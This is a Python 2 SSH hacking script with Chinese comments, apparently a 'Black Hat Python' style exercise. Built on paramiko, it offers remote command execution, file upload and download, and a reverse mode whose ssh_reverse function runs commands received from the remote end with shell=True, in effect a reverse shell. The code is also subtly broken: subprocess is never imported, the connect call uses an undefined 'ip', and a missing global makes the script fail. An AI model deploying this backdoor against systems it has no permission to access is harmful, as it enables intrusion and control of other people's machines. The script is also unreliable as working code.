#!/usr/bin/python
#-*- coding:utf-8 -*-
#连接远程ssh服务器，执行命令
#上传下载文件
#反向连接本地执行命令

import paramiko
import sys
import getopt
import os

command = False
download = False
upload = False
reverse= False
user=''
passwd=''
target=''

def ssh_command(client):
    #主循环执行命令
    while True:
        try:
            command=raw_input("command:")
            stdin, stdout, stderr = client.exec_command(command)
            #返回结果为unicode，需要进行编码
            response=''
            for line in stdout.readlines():
                response+=line.encode('utf-8')
            print(response)
        except KeyboardInterrupt:
            client.close()
            sys.exit(0)
def ssh_upload(client):
    transport=client.get_transport()
    sftp = paramiko.SFTPClient.from_transport(transport)
    #主循环执行命令
    while True:
        try:
            localpath= raw_input("localpath:")
            remotepath=raw_input("remotepath:") or ('/root/%s'%os.path.split(localpath)[1])
            sftp.put(localpath,remotepath)
            print '------------------------------------------------------------------------------'
            print 'UPLOAD SUCCESS:'
            print '[finished]local:%s >>>>> remote %s'%(localpath,remotepath)
            print '------------------------------------------------------------------------------'
        except KeyboardInterrupt:
            client.close()
            sys.exit(0)
def ssh_download(client):
    transport=client.get_transport()
    sftp = paramiko.SFTPClient.from_transport(transport)
    #主循环执行命令
    while True:
        try:
            remotepath=raw_input("remotepath:")
            localpath= raw_input("localpath:") or ('/root/%s'%os.path.split(remotepath)[1])
            sftp.get(remotepath,localpath)
            print '------------------------------------------------------------------------------'
            print 'DOWNLOAD SUCCESS:'
            print '[finished]local:%s <<<<< remote %s'%(localpath,remotepath)
            print '------------------------------------------------------------------------------'
        except KeyboardInterrupt:
            client.close()
            sys.exit(0)

def ssh_reverse(client):
    transport=client.get_transport()
    chan=transport.accept(1000)
    while True:
        try:
            command=chan.recv(1024)
            print 'execute command: %s'% command
            cmd_output= subprocess.check_output(command,shell=True)
            chan.send(cmd_output)
        except:
            chan.close()
            client.close()
            sys.exit(0)


def ssh_client(target,user,passwd):
    #初始化ssh客户端
    client=paramiko.SSHClient()
    #加载密钥
    client.load_host_keys('/root/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        #如果提供帐号密码
        if len(user)>2 and len(passwd)>6:
            client.connect(ip,username=user,password=passwd)
        else:
            #密钥连接
            client.connect(target)
        return client
    except:
        print('connect failed!')


def usage():
    print "ssh client"
    print
    print "Usage: bh_sshcmd.py -t ip [option]"
    print "-t --target               - remote ip"
    print "-c --command               - command shell"
    print "-u --upload    - upon receiving connection upload a file and write to [destination]"
    print "--user=****    - if you don't want to use rsa"
    print "--passwd=****    - if you don't want to use rsa"
    print
    print
    print "Examples: "
    print "bh_sshcmd.py -t 192.168.0.1 -c"
    print "bh_sshcmd.py -t 192.168.0.1 -u --user=**** --passwd=****"
    sys.exit(0)

def main():
    global command
    global download
    global upload
    global user
    global passwd
    global target
    
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hdcurt:",
            ["help", "download", "command", "upload","reverse","user=","passwd=","target="])
    except getopt.GetoptError as err:
        print str(err)
        usage()
    
    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-d", "--download"):
            download = True
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-u", "--upload"):
            upload = True
        elif o in ("-r", "--reverse"):
            reverse = True
        elif o in ("-t", "--target"):
            target = a
        elif o == "--user":
            user = a
        elif o == "--passwd":
            passwd = a
        else:
            assert False, "Unhandled Option"

    client=ssh_client(target,user,passwd)
    if command:
        ssh_command(client)
    elif upload:
        ssh_upload(client)
    elif download:
        ssh_download(client)
    elif reverse:
        ssh_reverse(client)
main()
